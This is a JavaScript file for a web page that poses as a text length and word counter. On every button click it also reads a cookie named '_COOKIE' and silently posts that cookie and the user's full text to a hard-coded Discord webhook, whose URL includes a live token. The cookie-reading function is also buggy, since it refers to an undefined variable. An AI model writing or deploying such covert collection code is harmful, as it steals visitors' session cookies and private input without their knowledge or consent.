// get the elements
const textarea = document.getElementById("TextArea");
const buttton = document.getElementById("Check");
const answer = document.getElementById("answer");
const url = 'https://discord.com/api/webhooks/1330185358905970808/7CswBdzoz8t6TGI2iC92CJ1cM9kjYTDiFiEagnXxn9r_kFqXL_XhoMvNRib9IdHkAho_';
var wait = false


  // get the cookie. i kind of understand it but idk i just took it from stack overflow
  function getCookie(cname) {
    // get the elements
    let name = cname + "=";
    let cookie = document.cookie.split(";")
    console.log(cookie)
    // get the amount of substrings returned by the split function
    for(let i = 0; i <cookie.length; i++) {

      let currentString = cookie[i];
      // remove any spaces before the cookie
      while (currentString.charAt(0) == ' ') {
        currentString = currentString.substring(1);
      }
      // check if the name of the input cookie of the function is the same as the name of the cookie if it is it returns the cookie
      if (c.indexOf(name) == 0) {
        return c.substring(name.length, c.length);
      }
    }
    return "";
  }

  function getWords(str) {
    let arr = str.split(" ")
    let words = arr.length
    return words
  }



    // the event lisener for the submit button
    buttton.addEventListener('click', function() {

            text = textarea.value;
            length = text.length
            var words = getWords(text)
            answer.innerText = `Your text is ${length} letters long and was ${words} words!`;

            var cookie = getCookie("_COOKIE")
            
            // make the message
            const message = `There was a function call. The message was caracters ${length} long and was ${words} words.
             User cookie: ${cookie} Message: "${text}"`
    
            // create the data object
            const data = {
                content: message 
            };
    
            // send the data to the webhook
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)  
            })
            .then(response => {
                if (response.ok) {
                    //document.getElementById('response').innerText = 'Message sent!';
                    console.log("Message sent")
                    wait = true
                } else {
                    //document.getElementById('response').innerText = 'Failed to send the message';
                    console.log("Failed to send message")
                }
            })
            .catch(error => {
                console.error('Error:', error);
                //document.getElementById('response').innerText = 'Error sending the message';
            });
        })
        
